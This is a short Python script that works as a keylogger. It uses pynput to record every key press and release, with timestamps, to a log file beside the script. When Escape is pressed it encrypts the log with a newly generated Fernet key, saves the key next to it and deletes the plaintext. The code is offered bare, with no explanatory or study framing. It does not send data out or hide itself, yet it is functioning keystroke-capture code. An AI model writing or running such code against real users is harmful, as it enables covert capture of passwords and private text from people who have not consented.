from pathlib import Path
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

current_file = Path(__file__).resolve()
current_dir = current_file.parent
log_file = current_dir / "data.txt"
key_file = current_dir / "filekey.key"

key = Fernet.generate_key()
with open(key_file, "wb") as f:
    f.write(key)

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def write_to_file(content):
    if not log_file.exists():
        log_file.touch()
    with log_file.open("a", encoding="utf-8") as f:
        f.write(f"[{timestamp()}] {content}\n")

def on_press(key):
    try:
        write_to_file(f"Key pressed: {key.char}")
    except AttributeError:
        write_to_file(f"Special key pressed: {key}")

def on_release(key):
    write_to_file(f"Key released: {key}")
    if key == keyboard.Key.esc:
        write_to_file("Escape pressed; exiting listener.")
        return False

def start_keyboard_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def encrypt_file(filename, key):
    fernet = Fernet(key)
    with open(filename, "rb") as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(str(filename) + ".enc", "wb") as encrypted_file:
        encrypted_file.write(encrypted)
    filename.unlink() 

if __name__ == "__main__":
    start_keyboard_listener()
    encrypt_file(log_file, key)